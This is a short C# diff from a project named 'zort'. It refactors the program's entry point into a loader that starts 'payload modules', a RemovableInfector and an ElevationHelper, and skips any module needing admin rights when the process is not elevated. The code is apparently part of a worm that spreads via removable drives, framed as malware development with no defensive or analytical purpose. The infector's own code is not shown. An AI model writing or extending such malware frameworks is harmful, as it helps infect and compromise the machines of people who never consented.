@@ -9,10 +9,31 @@ namespace zort
 {
     class Program
     {
-        static void Main(string[] args)
+        static void Main(string[] args) // Change Main to async Task
         {
-            RemovableInfector infector = new RemovableInfector();
-            infector.Start();
+            InitModules();
+            Console.ReadLine();
+        }
+
+        static void InitModules()
+        {
+            List<IPayloadModule> modules = new List<IPayloadModule>
+            {
+                new RemovableInfector(),
+                new ElevationHelper()
+            };
+
+            bool isAdmin = ElevationHelper.IsElevated();
+            modules.ForEach(m =>
+            {
+                if (m.RequiresAdmin && !isAdmin)
+                {
+                    Console.WriteLine($"Skipping module {m.ModuleName}, it requires admin privileges.");
+                    return;
+                }
+                Console.WriteLine($"Starting module {m.ModuleName}");
+                m.Start();
+            });
         }
     }
 }
